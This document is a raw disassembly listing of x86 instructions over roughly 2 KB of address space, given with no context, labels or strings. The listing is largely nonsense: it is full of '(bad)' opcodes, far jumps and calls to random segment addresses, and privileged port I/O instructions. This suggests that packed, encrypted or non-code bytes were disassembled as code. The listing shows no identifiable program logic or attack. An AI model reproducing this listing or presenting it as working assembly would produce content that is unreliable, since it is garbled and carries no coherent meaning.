  407f01:	pop    ebx
  407f02:	add    al,0xff
  407f04:	ds (bad) 
  407f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f07:	push   ds
  407f08:	fisub  DWORD PTR [bx+di]
  407f0b:	loope  0x407f8a
  407f0d:	adc    eax,0x6b69aab
  407f12:	pop    esi
  407f13:	add    ebx,DWORD PTR [edi+0x4b7ffc46]
  407f19:	or     ebp,DWORD PTR [edi]
  407f1b:	aaa    
  407f1c:	mov    edx,0x273ab019
  407f21:	sub    edx,DWORD PTR [ebx+ebx*8-0x11]
  407f25:	shl    WORD PTR [esi-0x4f],0x7f
  407f2a:	pop    eax
  407f2b:	addr16 sbb cl,al
  407f2e:	xchg   esi,eax
  407f2f:	out    0x3e,eax
  407f31:	sbb    DWORD PTR [ebp-0x60],ebp
  407f34:	adc    DWORD PTR [ebx+ecx*4+0x5e],ecx
  407f38:	sub    al,0x79
  407f3a:	fmul   DWORD PTR [edx+edi*1+0x8]
  407f3e:	xor    DWORD PTR [edx+ebx*8],edx
  407f41:	and    eax,0xefc06420
  407f46:	mov    ebp,0x10d42a94
  407f4b:	xchg   esi,eax
  407f4c:	push   eax
  407f4d:	(bad)  
  407f4e:	aam    0x16
  407f50:	and    ch,BYTE PTR [ebp-0xa0cc8fa]
  407f56:	imul   ebx,DWORD PTR [ecx],0x4aaf45e8
  407f5c:	sub    esi,DWORD PTR [esi]
  407f5e:	jns    0x407f5e
  407f60:	mov    ebp,DWORD PTR [edx+edx*1]
  407f63:	mov    cl,0xbf
  407f65:	sbb    eax,0xefc10b62
  407f6a:	jo     0x407f0b
  407f6c:	(bad)  
  407f6d:	sub    BYTE PTR [esi-0x25],dh
  407f70:	sub    eax,0x4b020265
  407f75:	pop    esi
  407f76:	jae    0x407fca
  407f78:	push   esp
  407f79:	push   0x627e844c
  407f7e:	ret    
  407f7f:	idiv   DWORD PTR ds:0x3ccee5ce
  407f85:	inc    eax
  407f86:	sbb    eax,0xf5f852f5
  407f8b:	sub    BYTE PTR [eax+0x16],bl
  407f8e:	ss stc 
  407f90:	push   ebp
  407f91:	mov    cl,BYTE PTR [esi+edx*1+0x69ef0393]
  407f98:	mov    ebx,DWORD PTR [edi-0x142ae6c1]
  407f9e:	ret    
  407f9f:	ret    
  407fa0:	rol    BYTE PTR [edi+0x6785ff5d],1
  407fa6:	xchg   ebp,eax
  407fa7:	add    DWORD PTR [bx],ebx
  407faa:	inc    esp
  407fab:	ror    bl,1
  407fad:	mov    esp,esi
  407faf:	mov    cl,0xb8
  407fb1:	xchg   esp,eax
  407fb2:	into   
  407fb3:	shl    esp,cl
  407fb5:	gs ja  0x407f76
  407fb8:	sbb    DWORD PTR [ebx],ecx
  407fba:	mov    ds:0x4d29a50f,eax
  407fbf:	fisubr WORD PTR [ebx]
  407fc1:	iret   
  407fc2:	sub    al,0xed
  407fc4:	(bad)  
  407fc6:	aas    
  407fc7:	sbb    BYTE PTR [ebp+0x1e],dh
  407fca:	mov    edx,0x42bf7ecf
  407fcf:	xchg   esp,eax
  407fd0:	and    DWORD PTR [ebx+0x60],0xf7338e13
  407fd7:	adc    esp,DWORD PTR [esp+eax*1-0x3c42cd4e]
  407fde:	add    eax,0xe7720ad2
  407fe3:	jmp    0xcc3e:0x6b8fbbe7
  407fea:	and    edi,DWORD PTR [eax+ebp*8+0x281e3c78]
  407ff1:	mov    ecx,0x2a82b664
  407ff6:	lods   eax,DWORD PTR ds:[esi]
  407ff7:	sbb    ebx,ebx
  407ff9:	lods   al,BYTE PTR ds:[esi]
  407ffa:	lahf   
  407ffb:	xchg   esp,eax
  407ffc:	xlat   BYTE PTR ds:[ebx]
  407ffd:	ror    DWORD PTR [eax-0x442eb044],0xd9
  408004:	jb     0x408053
  408006:	ss aad 0x59
  408009:	ror    DWORD PTR [ebx-0x21],1
  40800c:	inc    ebx
  40800d:	jnp    0x407fd3
  40800f:	dec    esp
  408010:	add    cl,BYTE PTR [esi]
  408012:	loope  0x407fee
  408014:	ret    0xba0d
  408017:	ja     0x407fdd
  408019:	nop
  40801a:	xor    DWORD PTR [edi],esi
  40801c:	or     ah,BYTE PTR [esi-0x37]
  40801f:	icebp  
  408020:	bound  ebx,QWORD PTR [esi-0x5bb7e004]
  408026:	sbb    DWORD PTR [eax+0x57653355],esi
  40802c:	imul   eax,ebp,0x8641b978
  408032:	jno    0x407fd9
  408034:	add    DWORD PTR [esi+0x450d7a96],ecx
  40803a:	mov    bh,0xf5
  40803c:	and    DWORD PTR [ebx+0x3d],edi
  40803f:	add    ebx,DWORD PTR [esi-0x74e0203a]
  408045:	lds    ebp,FWORD PTR [edx-0x30d56a1d]
  40804b:	xchg   ecx,eax
  40804c:	dec    ebx
  40804d:	pop    esi
  40804e:	lea    ecx,[esi+0x15cccffa]
  408054:	ins    DWORD PTR es:[edi],dx
  408055:	and    BYTE PTR [edi],al
  408057:	neg    DWORD PTR [ebx]
  408059:	jbe    0x4080d5
  40805b:	sub    eax,0x58d877b
  408060:	mov    ebx,0x499e483b
  408065:	ds inc edi
  408067:	push   es
  408068:	not    BYTE PTR [edx]
  40806a:	sbb    esi,esp
  40806c:	fidiv  DWORD PTR [eax+0x4484589d]
  408072:	mov    ds:0x7c563dc1,eax
  408077:	jnp    0x408040
  408079:	cld    
  40807a:	or     bh,BYTE PTR [ecx+0x104650c]
  408080:	cmp    al,0xee
  408082:	inc    edx
  408083:	mov    ch,BYTE PTR [ebx-0x71fd8461]
  408089:	out    0x53,eax
  40808b:	xlat   BYTE PTR ds:[ebx]
  40808c:	add    al,ch
  40808e:	push   ebp
  40808f:	std    
  408090:	ins    DWORD PTR es:[edi],dx
  408091:	(bad)  
  408092:	mov    dl,0xc1
  408094:	dec    edx
  408095:	mov    BYTE PTR [ecx-0x80],dh
  408098:	cwde   
  408099:	dec    esi
  40809a:	jnp    0x408091
  40809c:	aaa    
  40809d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40809e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40809f:	adc    BYTE PTR [esi],dl
  4080a1:	nop
  4080a2:	or     edi,DWORD PTR [ebp+0x30]
  4080a5:	das    
  4080a6:	imul   ebx,DWORD PTR [ebx-0x1064bd19],0xffffffda
  4080ad:	call   0x63b0:0xd23173dc
  4080b4:	push   ebx
  4080b5:	lock call 0x70906967
  4080bb:	push   ecx
  4080bc:	hlt    
  4080bd:	sub    al,0xec
  4080bf:	(bad)
  4080c2:	imul   ebx,DWORD PTR [ebx],0x47
  4080c5:	xchg   esp,eax
  4080c6:	or     BYTE PTR [ecx+0x70cb9e6b],ch
  4080cc:	mov    dl,cl
  4080ce:	sbb    al,0x67
  4080d0:	jle    0x408085
  4080d2:	lahf   
  4080d3:	pop    ecx
  4080d4:	fnstsw WORD PTR [esi]
  4080d6:	arpl   WORD PTR [eax+0x7f64c6ce],sp
  4080dc:	das    
  4080dd:	and    eax,0xaedfe2bc
  4080e2:	hlt    
  4080e3:	lods   eax,DWORD PTR ds:[esi]
  4080e4:	push   ebp
  4080e5:	daa    
  4080e6:	cmp    BYTE PTR [ebx+eax*1-0x26b09d4c],dh
  4080ed:	nop
  4080ee:	jnp    0x4080a3
  4080f0:	scas   al,BYTE PTR es:[edi]
  4080f1:	test   DWORD PTR [ebx-0x1d10f6d4],0xc2a7cd9c
  4080fb:	fadd   st,st(5)
  4080fd:	cld    
  4080fe:	ret    0x1af6
  408101:	mov    bh,0x1b
  408103:	retf   
  408104:	mov    cl,0xe8
  408106:	mov    al,0x72
  408108:	sbb    esi,DWORD PTR [ebp+0x45]
  40810b:	test   eax,0x3a55253c
  408110:	xchg   edx,eax
  408111:	and    al,0xf6
  408113:	pushf  
  408114:	ret    
  408115:	xchg   ebp,eax
  408116:	retf   
  408117:	test   eax,0xcf877708
  40811c:	add    DWORD PTR [edx-0x6f],0xe261bb7c
  408123:	mov    edi,0x2331f1a1
  408128:	or     eax,0x2f6f0b85
  40812d:	aaa    
  40812e:	enter  0x88ee,0xf5
  408132:	mov    ecx,0xbda25003
  408137:	push   0x4a
  408139:	adc    eax,0x5dd89278
  40813e:	jg     0x4080dd
  408140:	or     ebp,DWORD PTR [eax-0x25]
  408143:	jno    0x4080e6
  408145:	aam    0x19
  408147:	data16 sbb BYTE PTR [ecx],0x53
  40814b:	add    eax,0xaa7d91d
  408150:	jge    0x408191
  408152:	and    DWORD PTR [ebp+0x7a],ebp
  408155:	pop    esi
  408156:	inc    ecx
  408157:	jb     0x4081bb
  408159:	or     eax,0xd5319cd9
  40815e:	xchg   ebx,eax
  40815f:	shl    DWORD PTR [ebp-0x57b9ab82],1
  408165:	nop
  408166:	xchg   edx,eax
  408167:	jb     0x408114
  408169:	sub    esi,DWORD PTR [eax]
  40816b:	sub    eax,0xc731cc37
  408170:	nop
  408171:	xchg   ebx,eax
  408172:	stos   BYTE PTR es:[edi],al
  408173:	xchg   al,al
  408175:	xlat   BYTE PTR ds:[ebx]
  408176:	(bad)  
  408177:	push   DWORD PTR [edx]
  408179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40817a:	xchg   esp,eax
  40817b:	imul   DWORD PTR [eax]
  40817d:	(bad)  
  40817e:	sti    
  40817f:	push   0xeff7693e
  408184:	xchg   ecx,eax
  408185:	gs pop edx
  408187:	mov    esi,0xe2fe3921
  40818c:	jmp    0x4b0a:0xadb02d8
  408193:	mov    BYTE PTR [ecx+eiz*4],bl
  408196:	mov    eax,0x8d96295e
  40819b:	mov    esp,0xc6e57acd
  4081a0:	dec    eax
  4081a1:	mov    ah,BYTE PTR [esi-0xb]
  4081a4:	inc    ecx
  4081a5:	mov    BYTE PTR [ebp+0x3b207049],dh
  4081ab:	sahf   
  4081ac:	fs xor dl,dh
  4081af:	sub    DWORD PTR ss:[edi+0x15b928a4],edx
  4081b6:	mov    cl,0xc6
  4081b8:	inc    edi
  4081b9:	xchg   edi,eax
  4081ba:	adc    ebp,ebp
  4081bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081bd:	mov    eax,0x7fc3775c
  4081c2:	pop    ebx
  4081c3:	jno    0x4081b6
  4081c5:	mov    ch,0x3c
  4081c7:	xor    eax,0x673ea93e
  4081cc:	shr    esi,0xa3
  4081cf:	fwait
  4081d0:	sbb    edx,DWORD PTR [edi]
  4081d2:	inc    ecx
  4081d3:	dec    ebp
  4081d4:	ds std 
  4081d6:	jne    0x408183
  4081d8:	or     al,0x39
  4081da:	addr16 add al,0x10
  4081dd:	lock mul DWORD PTR ds:0x7f501b5c
  4081e4:	mov    al,ds:0x13132684
  4081e9:	push   esi
  4081ea:	push   esp
  4081eb:	sub    eax,0xc3d1bbdb
  4081f0:	fnstenv [ebx+eiz*2+0x2d]
  4081f4:	or     al,0xc9
  4081f6:	add    cl,0x3b
  4081f9:	sub    BYTE PTR [ecx-0x12],cl
  4081fc:	and    edx,0xffffffd3
  4081ff:	dec    ecx
  408200:	(bad)  [ebx-0x7d]
  408203:	dec    esi
  408204:	aam    0x52
  408206:	outs   dx,DWORD PTR ds:[esi]
  408207:	ja     0x4081f6
  408209:	cmp    esi,ebp
  40820b:	mov    ecx,0x6a9fc8da
  408210:	mov    ecx,0xb96868ff
  408215:	popf   
  408216:	pop    ebx
  408217:	jne    0x40820f
  408219:	push   esp
  40821a:	xchg   bh,bl
  40821c:	jae    0x4081aa
  40821e:	pushf  
  40821f:	pop    ss
  408220:	sar    BYTE PTR [esi+esi*2+0x50],0xd7
  408225:	js     0x4081b2
  408227:	test   DWORD PTR [ebx+0x2d12c3fb],edx
  40822d:	xor    DWORD PTR [edi+0x49f41904],eax
  408233:	mov    edi,0xa0d8f37b
  408238:	cmp    eax,0x6ea7a382
  40823d:	mov    ds:0x5daedc43,al
  408242:	xor    al,0x82
  408244:	cs iret 
  408246:	mov    esp,esi
  408248:	(bad)  
  408249:	or     edi,DWORD PTR [ebx]
  40824b:	mov    esp,?
  40824d:	sti    
  40824e:	cmc    
  40824f:	add    al,0x39
  408251:	cmp    eax,ecx
  408253:	mov    edx,0x1fae4aa6
  408258:	dec    ebp
  408259:	mov    ch,0x72
  40825b:	mov    esi,0xc138640
  408260:	(bad)  
  408261:	inc    ecx
  408262:	or     dh,0x95
  408265:	pop    ecx
  408266:	dec    esp
  408267:	dec    edi
  408268:	xor    esp,DWORD PTR [esi]
  40826a:	xlat   BYTE PTR ds:[ebx]
  40826b:	pop    ebp
  40826c:	or     BYTE PTR [eax],bh
  40826e:	cld    
  40826f:	push   ecx
  408270:	and    al,BYTE PTR [edx-0x4b049c97]
  408276:	fnsave [ecx+0x7c]
  408279:	jl     0x4082ec
  40827b:	mov    DWORD PTR [edx-0x2f],esi
  40827e:	nop
  40827f:	mov    WORD PTR [edi+0x1b],?
  408282:	and    al,0xe4
  408284:	fsub   QWORD PTR [eax+0x23]
  408287:	test   DWORD PTR [ebx+0x3d],ebp
  40828a:	mov    esp,DWORD PTR [edi+eax*4+0x29]
  40828e:	clc    
  40828f:	xchg   ebp,esi
  408291:	xchg   ebx,eax
  408292:	fcom   st(0)
  408294:	jg     0x408268
  408296:	sbb    eax,0x51365772
  40829b:	jmp    0x509f:0x2b5c6258
  4082a2:	call   0x2a85f929
  4082a7:	neg    al
  4082a9:	xchg   edx,eax
  4082aa:	jo     0x40823d
  4082ac:	adc    DWORD PTR [ebx+0x429a52d0],ebp
  4082b2:	sub    eax,0xe0568b34
  4082b7:	inc    esp
  4082b8:	cmp    bl,BYTE PTR [edi]
  4082ba:	sbb    BYTE PTR [edx+0x62],al
  4082bd:	jae    0x4082f2
  4082bf:	pop    esp
  4082c0:	push   ebp
  4082c1:	inc    esp
  4082c2:	fs jo  0x408246
  4082c5:	or     DWORD PTR [ecx-0x20],esp
  4082c8:	call   0x5d8c:0xd5bebb6b
  4082cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082d0:	and    esp,esp
  4082d2:	fcmovnb st,st(1)
  4082d4:	(bad)  
  4082d6:	bound  esi,QWORD PTR [esi-0x1f]
  4082d9:	mov    ebp,0x6abeb747
  4082de:	js     0x4082a8
  4082e0:	sbb    eax,DWORD PTR [ebp+0x414c14b2]
  4082e6:	retf   
  4082e7:	popf   
  4082e8:	daa    
  4082e9:	mov    ds:0x993c5936,eax
  4082ee:	pop    edx
  4082ef:	pop    esp
  4082f0:	cwde   
  4082f1:	xchg   BYTE PTR [esi-0x2a],cl
  4082f4:	ret    0x5927
  4082f7:	pop    edi
  4082f8:	inc    ecx
  4082f9:	(bad)
  4082fd:	jae    0x40834d
  4082ff:	xor    eax,0xbdf0bdb0
  408304:	cli    
  408305:	or     al,0x47
  408307:	or     ch,BYTE PTR [edx-0x1]
  40830a:	out    0xb1,eax
  40830c:	scas   eax,DWORD PTR es:[edi]
  40830d:	shl    BYTE PTR [edi-0x4f],cl
  408310:	jb     0x4082f8
  408312:	dec    eax
  408313:	jo     0x4082ac
  408315:	pop    esp
  408316:	(bad)  
  408317:	int3   
  408318:	loope  0x4082e4
  40831a:	jecxz  0x4082c1
  40831c:	lock dec ecx
  40831e:	adc    BYTE PTR [ebx-0x4b5d1daf],cl
  408324:	stos   BYTE PTR es:[edi],al
  408325:	mov    ah,0xfe
  408327:	sub    eax,0xfe949b03
  40832c:	rcl    esp,1
  40832e:	mov    al,0x80
  408330:	push   edi
  408331:	jo     0x408341
  408333:	loopne 0x4082b8
  408335:	mov    al,ds:0x78063e87
  40833a:	stos   DWORD PTR es:[edi],eax
  40833b:	jmp    0x408342
  40833d:	sbb    eax,0x3abc5888
  408342:	das    
  408343:	test   eax,0x7496cf61
  408348:	xor    bh,BYTE PTR [esi-0x42cd3a62]
  40834e:	jle    0x4083c8
  408350:	(bad)
  408353:	cmp    BYTE PTR ss:[ebx+0x453f13c5],ah
  40835a:	leave  
  40835b:	and    ah,BYTE PTR [ebx-0x65]
  40835e:	mov    esi,DWORD PTR [ecx+0x3d9eac43]
  408364:	ins    DWORD PTR es:[edi],dx
  408365:	xchg   ebx,eax
  408366:	iret   
  408367:	adc    al,0xd4
  408369:	sti    
  40836a:	dec    esp
  40836b:	and    edi,ebx
  40836d:	mov    ch,0x37
  40836f:	push   esi
  408370:	and    ebp,esp
  408372:	loope  0x40832f
  408374:	int3   
  408375:	test   eax,0xf4116e50
  40837a:	xchg   edi,eax
  40837b:	push   edx
  40837c:	jg     0x4083f4
  40837e:	lahf   
  40837f:	ss out 0xef,al
  408382:	popa   
  408383:	addr16 leave 
  408385:	shl    BYTE PTR [eax],cl
  408387:	(bad)  
  408388:	cmp    bl,BYTE PTR [ebx]
  40838a:	add    eax,0xb7dfd83f
  40838f:	arpl   WORD PTR [ebx+0x286f5bab],si
  408395:	int3   
  408396:	fwait
  408397:	inc    esi
  408398:	fdivr  DWORD PTR [edi+0x64ab55cf]
  40839e:	lahf   
  40839f:	inc    ecx
  4083a0:	and    cl,al
  4083a2:	aam    0xc7
  4083a4:	(bad)  
  4083a5:	adc    eax,0xfc16df4b
  4083aa:	xor    eax,0x51060ede
  4083af:	lds    ebp,FWORD PTR [ebx-0x6b172523]
  4083b5:	add    esp,DWORD PTR ds:0xd6f3a4e8
  4083bb:	push   ds
  4083bc:	jge    0x40836c
  4083be:	xor    dh,BYTE PTR [ebx-0x56]
  4083c1:	cmp    eax,0x7f8bf93d
  4083c6:	push   cs
  4083c7:	das    
  4083c8:	ds jbe 0x40835d
  4083cb:	mov    eax,0xe327b66b
  4083d0:	pop    ebx
  4083d1:	adc    BYTE PTR [edi-0x7f],cl
  4083d4:	cld    
  4083d5:	mov    al,0x5c
  4083d7:	cmp    BYTE PTR [ecx+0x3a],dl
  4083da:	(bad)  
  4083db:	stos   BYTE PTR es:[edi],al
  4083dc:	lea    edi,[esi+0x79794e62]
  4083e2:	jp     0x4083c2
  4083e4:	sbb    eax,0x7f566148
  4083e9:	jmp    0x40844f
  4083eb:	adc    bh,bh
  4083ed:	popf   
  4083ee:	add    esi,ebx
  4083f0:	cs jmp 0x7e50:0xa93b4433
  4083f8:	adc    eax,0xfc00ff92
  4083fd:	addr16 sbb eax,0xcb1b698b
  408403:	jmp    0x40841c
  408405:	test   al,0x24
  408407:	(bad)  
  408408:	push   eax
  408409:	bound  edx,QWORD PTR [eax-0x50]
  40840c:	shl    BYTE PTR [ecx],1
  40840e:	data16 in al,dx
  408410:	aam    0xf4
  408412:	inc    ebx
  408413:	fld    st(2)
  408415:	inc    ebp
  408416:	into   
  408417:	lahf   
  408418:	hlt    
  408419:	(bad)  
  40841a:	in     al,dx
  40841b:	(bad)  
  40841c:	repz mov fs,WORD PTR [ebx]
  40841f:	sbb    cl,al
  408421:	xor    edi,DWORD PTR [edi+0x5128abf]
  408427:	inc    ebx
  408428:	dec    ecx
  408429:	test   BYTE PTR ds:0xc54f31e5,al
  40842f:	in     eax,dx
  408430:	call   0x7cfdb535
  408435:	aam    0x8
  408437:	push   ecx
  408438:	hlt    
  408439:	sub    eax,0x9c2ac0
  40843e:	das    
  40843f:	fidivr WORD PTR [edi+0x112f2bb]
  408445:	add    DWORD PTR [ebx+0x2],ebx
  408448:	adc    BYTE PTR [eax],al
  40844a:	cmp    cl,ah
  40844c:	jmp    0x4083fb
  40844e:	mov    ecx,0xd09adb6e
  408453:	xor    eax,0x81a31b13
  408458:	cmc    
  408459:	aaa    
  40845a:	pushf  
  40845b:	rcr    eax,cl
  40845d:	shl    BYTE PTR [edi],1
  40845f:	sar    DWORD PTR [eax+0x63918866],1
  408465:	fbstp  TBYTE PTR [esi]
  408467:	cmp    cl,BYTE PTR [ebp-0x16b6ea8a]
  40846d:	push   0xe3441bfb
  408472:	popf   
  408473:	and    bh,BYTE PTR [ebp-0x48]
  408476:	jg     0x40840b
  408478:	mov    edx,0x5ad64e5e
  40847d:	xor    al,0x52
  40847f:	(bad)  [esi+0x9a36197]
  408485:	addr16 test al,0x4a
  408488:	pop    edi
  408489:	cld    
  40848a:	xchg   DWORD PTR [ebp+ebp*4+0x2f],esp
  40848e:	call   0x4f4:0x3340aca8
  408495:	(bad)  
  408496:	ins    DWORD PTR es:[edi],dx
  408497:	mov    esi,0x111e6af5
  40849c:	jmp    FWORD PTR [edi-0x9]
  40849f:	and    eax,0x7498f659
  4084a4:	inc    DWORD PTR [edx-0x29]
  4084a7:	xor    DWORD PTR [edi-0x3e],esi
  4084aa:	cmc    
  4084ab:	aad    0x70
  4084ad:	sub    DWORD PTR [ecx+0x24625921],edi
  4084b3:	pop    ds
  4084b4:	shl    DWORD PTR [ecx],1
  4084b6:	mov    al,0xf9
  4084b8:	or     DWORD PTR [ecx],0x43a5cec
  4084be:	mov    cl,0x1d
  4084c0:	push   ebp
  4084c1:	enter  0x6d12,0x1f
  4084c5:	aam    0x93
  4084c7:	mov    ds,WORD PTR [edi-0x731a064]
  4084cd:	sbb    al,0x3
  4084cf:	sar    BYTE PTR [ebx+eiz*4+0x167ce133],0xe3
  4084d7:	in     eax,0x3b
  4084d9:	xchg   ecx,eax
  4084da:	add    BYTE PTR [ebp+0x54],0xf8
  4084de:	adc    DWORD PTR [edx-0x45],esp
  4084e1:	sub    BYTE PTR ss:[edx-0x5f745dad],cl
  4084e8:	cmp    al,0x0
  4084ea:	cmp    esi,DWORD PTR [edi-0x4acfd548]
  4084f0:	stos   DWORD PTR es:[edi],eax
  4084f1:	mov    esi,DWORD PTR [edi]
  4084f3:	xchg   edx,eax
  4084f4:	mov    eax,0x50d14182
  4084f9:	call   0x26cd8b3d
  4084fe:	jmp    0x4d34:0xe6de6bfb
  408505:	lods   eax,DWORD PTR ds:[esi]
  408506:	push   ebp
  408507:	mov    DWORD PTR [eax-0xb],esi
  40850a:	jne    0x4084bf
  40850c:	popa   
  40850d:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40850f:	xor    BYTE PTR [edx+ecx*8+0x6da5e398],cl
  408516:	mov    al,0x30
  408518:	in     eax,0x37
  40851a:	and    BYTE PTR [ebx-0x1cb1217f],bl
  408520:	jnp    0x4084b3
  408522:	test   DWORD PTR [ebp+0x3364b1bf],eax
  408528:	out    0x8a,al
  40852a:	xchg   BYTE PTR [esi-0x218285ff],bl
  408530:	inc    esi
  408531:	icebp  
  408532:	xchg   BYTE PTR [eax+0x21bcdd82],ah
  408538:	cwde   
  408539:	sub    BYTE PTR [esi+0x3f],ch
  40853c:	pop    eax
  40853d:	pop    ebx
  40853e:	push   cs
  40853f:	mov    al,0xe0
  408541:	dec    ecx
  408542:	(bad)  
  408543:	out    dx,al
  408544:	sub    ah,ch
  408546:	xchg   edx,eax
  408547:	test   BYTE PTR [esi-0xd17eae0],0x66
  40854e:	sub    eax,0x9bc00737
  408553:	jle    0x408532
  408555:	xor    ebp,ecx
  408557:	jmp    0x9020b86c
  40855c:	and    al,BYTE PTR [ebp+eax*4+0x3c2d8d16]
  408563:	cld    
  408564:	or     al,0x7d
  408566:	xor    DWORD PTR [esi+ebp*4-0x47],ecx
  40856a:	add    ebp,DWORD PTR [ebx+0x59]
  40856d:	and    bl,BYTE PTR [edi-0xb]
  408570:	sar    BYTE PTR [ebx+0x4699978b],1
  408576:	imul   edi,DWORD PTR [edx+0x1c466a94],0xffffffdc
  40857d:	in     al,0x78
  40857f:	mov    ah,0x67
  408581:	mov    ebx,0x8a017cb8
  408586:	add    DWORD PTR [ebx],edx
  408588:	xchg   edx,eax
  408589:	or     dl,bh
  40858b:	inc    ecx
  40858c:	mov    edi,0x534021e7
  408591:	out    dx,eax
  408592:	xchg   ecx,esp
  408594:	mov    eax,ds:0x80bbdb93
  408599:	nop
  40859a:	sahf   
  40859b:	mov    dl,0x20
  40859d:	cmc    
  40859e:	mov    bl,0x64
  4085a0:	and    ah,BYTE PTR [edx-0x109c2640]
  4085a6:	shl    BYTE PTR ds:0x1fd5fc82,0x57
  4085ad:	loopne 0x4085da
  4085af:	and    DWORD PTR [edx-0x30e1c6f7],eax
  4085b5:	xchg   ebp,eax
  4085b6:	popf   
  4085b7:	xchg   eax,ebp
  4085b9:	xor    DWORD PTR [ebx-0x1e],esp
  4085bc:	jno    0x4085d6
  4085be:	xor    ah,dh
  4085c0:	aas    
  4085c1:	test   DWORD PTR [ebx+0x5f],edx
  4085c4:	mov    edi,0x3ceed957
  4085c9:	and    eax,0xd4479e9e
  4085ce:	jne    0x408640
  4085d0:	in     al,0x8a
  4085d2:	int3   
  4085d3:	fcom   DWORD PTR [ebp+0xd5524e]
  4085d9:	push   ebp
  4085da:	mov    cl,0xc5
  4085dc:	loopne 0x408645
  4085de:	mov    esi,0xeee82689
  4085e3:	and    eax,DWORD PTR [esi+eax*4]
  4085e6:	fdiv   QWORD PTR [ebp-0x6a7dac4a]
  4085ec:	call   0x9c459b3a
  4085f1:	scas   al,BYTE PTR es:[edi]
  4085f2:	stos   BYTE PTR es:[edi],al
  4085f3:	sub    al,0x3
  4085f5:	jle    0x408676
  4085f7:	(bad)  
  4085f8:	in     al,0x43
  4085fa:	or     al,0x9d
  4085fc:	retf   
  4085fd:	push   0xfffffffc
  4085ff:	in     eax,dx
  408600:	test   cl,dh
  408602:	out    dx,al
  408603:	push   eax
  408604:	cmc    
  408605:	add    al,0x4
  408607:	pop    ebp
  408608:	jge    0x4085f9
  40860a:	aas    
  40860b:	mov    DWORD PTR [ebx+0x558547d7],eax
  408611:	push   edx
  408612:	aam    0x88
  408614:	sahf   
  408615:	ss pop edx
  408617:	fidiv  DWORD PTR [ecx]
  408619:	mov    eax,ds:0xc9d3a86e
  40861e:	mov    ch,0x13
  408620:	(bad)  
  408621:	out    dx,al
  408622:	std    
  408623:	add    bh,BYTE PTR [edi]
  408625:	adc    BYTE PTR [ecx+0x2f1a2f6],cl
  40862b:	xlat   BYTE PTR ds:[ebx]
  40862c:	loope  0x40865f
  40862e:	(bad)  
  40862f:	sub    bl,ah
  408631:	xchg   DWORD PTR gs:[eax+0x5a61cc6],esp
  408638:	cmovae edx,DWORD PTR [edx+0x1585414e]
  40863f:	enter  0xe942,0x6d
  408643:	and    esi,DWORD PTR [esi]
  408645:	cdq    
  408646:	mov    esp,0xd30e08
  40864b:	dec    eax
  40864c:	aas    
  40864d:	xor    ah,BYTE PTR [eax-0x2b2a88a5]
  408653:	imul   ebp,DWORD PTR [ebx],0x59
  408656:	inc    ebp
  408657:	dec    ebx
  408658:	arpl   WORD PTR [edx-0x70],bp
  40865b:	je     0x4085ea
  40865d:	(bad)  [edi]
  40865f:	cmc    
  408660:	mov    dl,0xd0
  408662:	jnp    0x4086ac
  408664:	inc    eax
  408665:	jnp    0x4085f2
  408667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408668:	pop    edi
  408669:	pop    es
  40866a:	cmp    al,0x6b
  40866c:	inc    ebp
  40866d:	adc    eax,0xb57364f5
  408672:	pop    ebp
  408673:	aam    0x82
  408675:	push   cs
  408676:	mov    DWORD PTR [edx],0x60fb4c26
  40867c:	pop    edi
  40867d:	sub    al,0x11
  40867f:	and    ecx,DWORD PTR [ebp-0x1426fe98]
  408685:	jae    0x40868b
  408687:	cwde   
  408688:	pop    esi
  408689:	cs jnp 0x408659
  40868c:	cmp    BYTE PTR [edi+0x56],ah
  40868f:	add    ebp,esp
  408691:	leave  
  408692:	sub    dh,BYTE PTR [ecx]
  408694:	in     eax,dx
  408695:	add    bl,BYTE PTR [eax-0x19]
  408698:	cmp    al,0x28
  40869a:	imul   edx,DWORD PTR [ebp-0x6460fc6a],0xec4b97f9
  4086a4:	jl     0x40863b
  4086a6:	push   es
  4086a7:	leave  
  4086a8:	inc    ebx
  4086a9:	fwait
  4086aa:	cmp    eax,0x1292c5e3
  4086af:	add    bh,BYTE PTR [eax]
  4086b1:	xchg   esp,eax
  4086b2:	add    bl,dl
  4086b4:	sub    eax,0x5e7dc80c
  4086b9:	jbe    0x408660
  4086bb:	ins    DWORD PTR es:[edi],dx
  4086bc:	pop    esp
  4086bd:	add    al,BYTE PTR [ebx+0x7da931b3]
  4086c3:	into   
  4086c4:	mov    ah,0xee
  4086c6:	mov    esp,0x994e249f
  4086cb:	xor    eax,0xf17074f4
  4086d0:	inc    edi
  4086d1:	inc    ecx
  4086d2:	out    0x6b,al
  4086d4:	call   0x92d6:0x9a0744c0
  4086db:	mov    ds,WORD PTR [edi+0x44eab966]
  4086e1:	neg    DWORD PTR [edx]
  4086e3:	pop    ecx
  4086e4:	jle    0x4086d2
  4086e6:	in     eax,dx
  4086e7:	(bad)  
  4086e8:	lods   al,BYTE PTR ds:[esi]
  4086e9:	and    BYTE PTR [edi+0x36],dl
  4086ec:	jl     0x4086b4
  4086ee:	or     BYTE PTR [ecx],dh
  4086f0:	jg     0x408674
  4086f2:	das    
  4086f3:	mov    esi,0x58228a5
  4086f8:	int3   
  4086f9:	pop    esi
  4086fa:	das    
  4086fb:	frstor [esi-0x40f945f4]
  408701:	mov    fs,esi
  408703:	inc    ecx
  408704:	xor    BYTE PTR [ebp+esi*4+0x1765d42b],ah
  40870b:	pusha  
  40870c:	int3   
  40870d:	repnz mov fs,WORD PTR [eax+edi*4+0x74]
  408712:	mov    dl,0x8c
  408714:	mov    es,WORD PTR [ebp+0x2502857c]
  40871a:	sbb    al,0x4a
  40871c:	sub    dh,BYTE PTR [ebp-0x89044b0]
  408722:	add    BYTE PTR [ebx+ebp*2-0x328fa420],dh
  408729:	xchg   edi,eax
  40872a:	cmp    edx,0xd11dbe87
  408730:	mov    eax,ds:0xecf066a8
  408735:	cmp    DWORD PTR [edx-0x5c],0x8bb48495
  40873c:	jb     0x408766
  40873e:	mov    dl,0x9c
  408740:	adc    al,0x8
  408742:	mov    dh,0x91
  408744:	jmp    0xe10a:0xd1e08afb
  40874b:	int3   
  40874c:	int3   
